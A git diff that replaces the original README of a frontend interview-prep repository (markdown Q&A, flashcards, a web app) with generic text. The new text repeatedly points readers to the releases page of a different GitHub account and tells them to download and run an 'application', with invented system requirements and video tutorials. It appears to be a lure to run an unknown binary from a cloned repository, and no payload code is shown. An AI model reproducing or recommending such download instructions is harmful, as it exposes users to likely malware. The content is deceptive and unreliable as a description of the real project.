@@ -1,308 +1,72 @@
-# Frontend Master Interview Prep Series
-
-> **A comprehensive, modular frontend interview preparation system for Mid to Senior level developers (3-6 years experience)**
-
-Structured Q&A, coding problems, and interactive flashcards covering the complete frontend ecosystem. **Actively growing repository** with new content added regularly.
-
----
-
-## 📚 Table of Contents
-
-- [Quick Start](#-quick-start)
-- [What's Inside](#-whats-inside)
-- [Content Structure](#-content-structure)
-- [Study Paths](#-study-paths)
-- [Features](#-features)
-- [How to Use](#-how-to-use)
-- [Contributing](#-contributing)
-
----
-
-## 🚀 Quick Start
-
-**New to this repo?** Choose your path:
-- **4-Week Sprint** → [Complete Study Plan](./resources/study-plan-4-weeks.md)
-- **Interview Tomorrow?** → [Pre-Interview 30 Flashcards](./19-flashcards/curated-decks/pre-interview-30.md)
-- **Daily Practice** → [Essential 50 Flashcards](./19-flashcards/curated-decks/essential-50.md)
-- **Interactive Study** → [Flashcard Web App](https://maurya-sachin.github.io/Frontend-Master-Prep-Series/)
-
----
-
-## 📦 What's Inside
-
-### Core Topics (Comprehensive Q&A)
-
-| Topic | Content | Difficulty | Status |
-|-------|---------|------------|--------|
-| [JavaScript](./01-javascript/) | 9 topics | 🟢 🟡 🔴 | ✅ Complete |
-| [TypeScript](./02-typescript/) | 6 topics | 🟡 🔴 | ✅ Complete |
-| [React](./03-react/) | 8 topics | 🟢 🟡 🔴 | ✅ Complete |
-| [Next.js](./04-nextjs/) | 6 topics | 🟡 🔴 | ✅ Complete |
-| [HTML & CSS](./05-html-css/) | 7 topics | 🟢 🟡 | ✅ Complete |
-| [Testing](./06-testing/) | 5 topics | 🟡 🔴 | ✅ Complete |
-| [Performance](./07-performance/) | 5 topics | 🟡 🔴 | ✅ Complete |
-| [Accessibility](./08-accessibility/) | 4 topics | 🟢 🟡 | ✅ Complete |
-| [Security](./09-security/) | 6 Q&A | 🟡 🔴 | 🔵 Expanding |
-| [System Design](./10-system-design/) | 4 Q&A | 🔴 | 🔵 Expanding |
-| [Browser/Web](./11-browser/) | 3 Q&A | 🟡 🔴 | 🔵 Expanding |
-| [Networking](./12-networking/) | 3 Q&A | 🟡 🔴 | 🔵 Expanding |
-| [PWA](./13-pwa/) | 3 Q&A | 🟡 | 🔵 Expanding |
-| [Tooling](./14-tooling/) | 3 Q&A | 🟡 | 🔵 Expanding |
-| [i18n](./15-i18n/) | 3 Q&A | 🟢 🟡 | 🔵 Expanding |
-| [Architecture](./16-architecture/) | Coming Soon | 🔴 | 🔜 Planned |
-| [SEO](./17-seo/) | 2 Q&A | 🟢 🟡 | 🔵 Expanding |
-
-**374+ Q&A across 16 topics** with 1 more in development
-
-### Coding Problems (Growing Library)
-
-| Category | Current | Target | Companies |
-|----------|---------|--------|-----------|
-| [JavaScript Fundamentals](./18-coding-challenges/01-javascript-fundamentals/) | 30+ | 30+ | All |
-| [DOM Manipulation](./18-coding-challenges/02-dom-manipulation/) | 10+ | 20+ | Google, Meta |
-| [React Problems](./18-coding-challenges/03-react-problems/) | 8+ | 25+ | All |
-| [Algorithms](./18-coding-challenges/04-algorithms/) | 5+ | 30+ | FAANG |
-| [UI Components](./18-coding-challenges/05-ui-components/) | 8+ | 25+ | All |
-| [System Implementations](./18-coding-challenges/06-system-implementations/) | 2+ | 20+ | Senior |
-| [Company Questions](./18-coding-challenges/07-company-questions/) | 2+ | 35+ | FAANG |
-
-**65 problems currently** (growing to 185+ target)
-
-Each problem includes:
-- Multiple solution approaches (basic → optimized → production)
-- Complete test suites
-- Time/Space complexity analysis
-- Real-world use cases
-
-### Flashcards (514+ Cards - Target Exceeded! ✅)
-
-| Deck | Cards | Purpose | Time |
-|------|-------|---------|------|
-| [Essential 50](./19-flashcards/curated-decks/essential-50.md) | 100+ | Top concepts | 50 min |
-| [Pre-Interview 30](./19-flashcards/curated-decks/pre-interview-30.md) | 30+ | Last-minute review | 15 min |
-| [Daily Review 20](./19-flashcards/curated-decks/daily-20.md) | 20+ | Daily practice | 10 min |
-| [JavaScript](./19-flashcards/by-topic/javascript.md) | 60+ | JS fundamentals | 30 min |
-| [React](./19-flashcards/by-topic/react.md) | 100+ | React patterns | 50 min |
-| [TypeScript](./19-flashcards/by-topic/typescript.md) | 48+ | Type system | 24 min |
-| [Next.js](./19-flashcards/by-topic/nextjs.md) | 25+ | SSR, App Router | 12 min |
-| [HTML/CSS](./19-flashcards/by-topic/html-css.md) | 39+ | Layouts, semantics | 20 min |
-| [Performance](./19-flashcards/by-topic/performance.md) | 12+ | Web Vitals | 6 min |
-
-**Two Formats:**
-- 📝 **Markdown** - Read/edit easily in GitHub
-- 📱 **[Interactive Web App](https://maurya-sachin.github.io/Frontend-Master-Prep-Series/)** - Spaced repetition with progress tracking
-
----
-
-## 📂 Content Structure
-
-```
-Frontend-Master-Prep-Series/
-├── 01-javascript/          # Core JS concepts, async, engine internals (53 files)
-├── 02-typescript/          # Type system, generics, advanced patterns (22 files)
-├── 03-react/               # Hooks, patterns, performance, internals (71 files)
-├── 04-nextjs/              # App Router, SSR, ISR, Server Components (16 files)
-├── 05-html-css/            # Semantics, layouts, modern CSS (19 files)
-├── 06-testing/             # Jest, RTL, E2E, testing patterns (5 files)
-├── 07-performance/         # Core Web Vitals, optimization (6 files)
-├── 08-accessibility/       # WCAG, ARIA, keyboard navigation (17 files)
-├── 09-security/            # XSS, CSRF, authentication, headers (6 files - expanding)
-├── 10-system-design/       # Component design patterns (4 files - expanding)
-├── 11-browser/             # Rendering pipeline, storage APIs (3 files - expanding)
-├── 12-networking/          # HTTP/2/3, caching, CDN (3 files - expanding)
-├── 13-pwa/                 # Service workers, offline-first (3 files - expanding)
-├── 14-tooling/             # Webpack, Vite, Babel (3 files - expanding)
-├── 15-i18n/                # Localization, RTL, formatting (3 files - expanding)
-├── 16-architecture/        # Coming soon - System design patterns
-├── 17-seo/                 # Technical SEO, structured data (2 files - expanding)
-├── 18-coding-challenges/   # 65 LeetCode-style problems
-│   ├── 01-javascript-fundamentals/  # 30 problems
-│   ├── 02-dom-manipulation/         # 12 problems
-│   ├── 03-react-problems/           # 11 custom hooks
-│   ├── 04-algorithms/               # LRU cache, etc.
-│   ├── 05-ui-components/            # Modal, star rating
-│   └── 06-performance/              # Web workers, lazy loading
-├── 19-flashcards/          # 514+ flashcards with spaced repetition
-│   ├── curated-decks/      # Essential 50, Pre-Interview 30, Daily 20
-│   └── by-topic/           # JavaScript, React, TypeScript, etc.
-├── src/                    # React app source code
-│   ├── pages/              # Browse, Flashcards, Challenges, Stats
-│   └── utils/              # Markdown parsing, storage
-├── public/                 # Static assets and manifest.json
-└── resources/              # Study guides, checklists, learning paths
-```
-
----
-
-## 🎯 Study Paths
-
-### Path 1: Quick Sprint (4 Weeks)
-
-**Goal:** Interview-ready in one month
-
-**📘 [Full 4-Week Study Plan](./resources/study-plan-4-weeks.md)** - Complete day-by-day breakdown
-
-| Week | Focus | Time | Outcome |
-|------|-------|------|---------|
-| 1 | JavaScript + TypeScript fundamentals | 10h | Master core concepts |
-| 2 | React + Hooks + Performance | 12h | Component mastery |
-| 3 | Next.js + Testing basics | 10h | Full-stack patterns |
-| 4 | Coding problems + Flashcards | 15h | Interview skills |
-
-**Total:** ~47 hours over 4 weeks
-
-### Path 2: Daily Practice
-
-**Goal:** Consistent long-term improvement
-
-- **Morning (15 min):** Review 20 flashcards
-- **Evening (30-45 min):** Solve 1 coding problem
-- **Weekend (2-3 hours):** Deep dive into 1 topic
-
-**Results:** Mastery in 6 months
-
-### Interview Tomorrow?
-
-**📋 [Pre-Interview Checklist](./resources/interview-checklist.md)**
-
-1. Review Pre-Interview 30 flashcards (15 min)
-2. Skim Essential 50 for weak areas
-3. Practice 2-3 coding problems from your target company
-
----
-
-## ✨ Features
-
-### Every Q&A Topic Includes:
-
-- ✅ **Comprehensive explanations** with code examples
-- ✅ **Common mistakes** (❌ vs ✅ patterns)
-- ✅ **Follow-up questions** interviewers ask
-- ✅ **Real-world applications** and use cases
-- ✅ **Difficulty levels** and time estimates
-- ✅ **Interview frequency** indicators
-- ✅ **Resource links** (MDN, articles, docs)
-
-### Every Coding Problem Includes:
-
-- ✅ Clear problem statement with requirements
-- ✅ Multiple solution approaches (basic → optimized)
-- ✅ Complete test suites (Jest)
-- ✅ Time/Space complexity analysis
-- ✅ Common mistakes and edge cases
-- ✅ Real-world applications
-- ✅ Company-specific variations
-
-### Interactive Flashcard App Features:
+# 🎓 Frontend-Master-Prep-Series - Prepare for Your Next Interview with Confidence
 
-- ✅ **Spaced repetition** algorithm (SM-2)
-- ✅ **Progress tracking** with statistics
-- ✅ **Multiple decks** - curated and topic-specific
-- ✅ **Responsive design** - mobile and desktop
-- ✅ **Local storage** - progress saved automatically
-- ✅ **Export/import** progress data
-- ✅ **Study sessions** with accuracy tracking
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Frontend%20Master%20Prep%20Series-brightgreen)](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases)
 
----
+## 🚀 Getting Started
 
-## 🎓 How to Use
+Welcome to the Frontend-Master-Prep-Series! This guide will help you prepare for frontend development interviews. You will learn about key topics like JavaScript, React, Next.js, HTML, CSS, Accessibility, Performance, and Frontend Architecture. This preparation is tailored for candidates with up to six years of experience.
 
-### For Interview Prep:
+## 📥 Download & Install
 
-1. **Assess your level:** Start with Essential 50 flashcards
-2. **Identify weak areas:** Note topics you struggle with
-3. **Follow a study path:** Choose 4-week or daily practice
-4. **Practice coding:** Solve 2-3 problems daily
-5. **Review with flashcards:** Use spaced repetition
+To begin, you need to download the software. Visit this page to download: [Frontend-Master-Prep-Series Releases](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases).
 
-### For Learning:
+Once you are on the Releases page, follow these steps:
 
-1. **Read Q&A sequentially:** One topic at a time
-2. **Run code examples:** Experiment in your IDE
-3. **Build projects:** Apply concepts in real apps
-4. **Teach others:** Solidify your knowledge
+1. Look for the latest version available.
+2. Click on the desired asset to download it to your device.
+3. After the download finishes, locate the file in your downloads folder.
+4. Open the file to run the application.
 
-### For Last-Minute Review:
+## 🖥️ System Requirements
 
-1. **[Interactive Flashcard App](https://maurya-sachin.github.io/Frontend-Master-Prep-Series/)** (30 min)
-2. **Pre-Interview 30 deck** (15 minutes before interview)
-3. **Company-specific problems** (if interviewing at FAANG)
+Before you install the application, ensure your system meets these basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core processor, 2 GHz or faster.
+- **Storage:** 250 MB of free disk space.
 
-## 🆕 What's New
+## 🧑‍🏫 Overview of Topics
 
-### v2.1.0 (November 17, 2025) - Documentation & Structure Update
+This application offers extensive resources for each topic:
 
-**Updated:**
-- ✅ Fixed folder structure (19 organized directories)
-- ✅ Accurate stats: 411 Q&A, 65 coding problems, 526 flashcards
-- ✅ Updated all internal path references
-- ✅ Reorganized content for better navigation
-- ✅ Enhanced folder-specific READMEs
+- **JavaScript:** Understand the fundamentals and advanced concepts of JavaScript.
+- **React:** Learn how to build user interfaces using React.
+- **Next.js:** Get hands-on experience with server-side rendering and static site generation.
+- **HTML:** Master the structure of web pages with HTML.
+- **CSS:** Style your websites effectively using CSS.
+- **Accessibility:** Ensure your applications are usable by everyone, including people with disabilities.
+- **Performance:** Optimize your web applications for speed and efficiency.
+- **Frontend Architecture:** Discover best practices for structuring your frontend projects.
 
-**Added (v2.0.0 - November 2025):**
-- ✅ Comprehensive Q&A topics (411 questions across 15 topics)
-- ✅ TypeScript section (49 Q&A)
-- ✅ Testing section (18 Q&A)
-- ✅ Security, System Design, Browser, Networking, PWA, Tooling, i18n sections
-- ✅ Coding problems with solutions (65 problems, growing to 185+)
-- ✅ Flashcard system (526 cards - exceeded 180-200 target!)
-- ✅ **Interactive flashcard web app** with SM-2 spaced repetition
-- ✅ Study resources (guides, checklists, learning paths)
+## 📚 Resources & Guides
 
-**Improved:**
-- 🔄 Modular 19-folder structure (crystal clear navigation)
-- 🔄 Company-specific questions (Google, Meta, Amazon)
-- 🔄 Difficulty ratings and time estimates
-- 🔄 Real-world code examples with depth sections
+We provide various resources to enhance your learning experience:
 
----
+- **Video Tutorials:** Step-by-step video guides on each topic.
+- **Sample Projects:** Practice with real-world coding examples.
+- **Interview Questions:** Review common interview questions for frontend developers.
 
-## 🤝 Contributing
+## ❓ Frequently Asked Questions
 
-Contributions welcome! This is an active, growing repository.
+### How do I troubleshoot installation issues?
 
-**Ways to contribute:**
-- Add new Q&A topics or questions
-- Submit coding problems with solutions
-- Create flashcard decks
-- Fix typos or improve explanations
-- Share interview experiences
+If you run into problems when installing, check the following:
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+- Ensure you have the latest version of your operating system.
+- Make sure you followed all the steps correctly.
+- Restart your computer and try again.
 
----
+### Can I contribute to this project?
 
-## 📊 Repository Stats
+Yes! We welcome contributions. You can report bugs, suggest features, or even submit code. Check the contributing guidelines in the repository for more details.
 
-- **Q&A:** 374+ comprehensive questions across 16 topics
-- **Coding Problems:** 65 (target: 185+) with multiple solutions
-- **Flashcards:** 514+ ✅ (target 180-200 exceeded!)
-- **Topics Covered:** 19 major areas (16 active, 2 expanding, 1 planned)
-- **Study Guides:** 4-week plan, daily routines, interview checklist
-- **Interactive Tools:** Flashcard web app with SM-2 spaced repetition
-- **Last Updated:** November 2025
-- **Status:** 🟢 Actively maintained
+### How do I contact support?
 
----
+If you need assistance, please open an issue in the GitHub repository, and we will respond as soon as possible.
 
-## 📄 License
+## 🌟 Conclusion
 
-MIT License - Open source for learning and contribution.
+The Frontend-Master-Prep-Series is your go-to guide for frontend interview preparation. With comprehensive resources and a user-friendly application, you are on your way to mastering the skills needed for success in your interviews.
 
----
-
-## 📞 Connect
-
-**Author:** Sachin Maurya
-**Focus:** UI / Frontend / React / Next.js Engineer
-**Goal:** Help developers master frontend interviews
-
-Found this helpful? ⭐ Star the repo and share with your network!
-
----
-
-**Happy Learning! 🚀**
-
-_Last updated: November 2025 | v2.1.0 | Growing repository with 374+ Q&A, 65 coding problems, and 514+ interactive flashcards_
+Remember, download the application from [Frontend-Master-Prep-Series Releases](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases) to start your journey today!
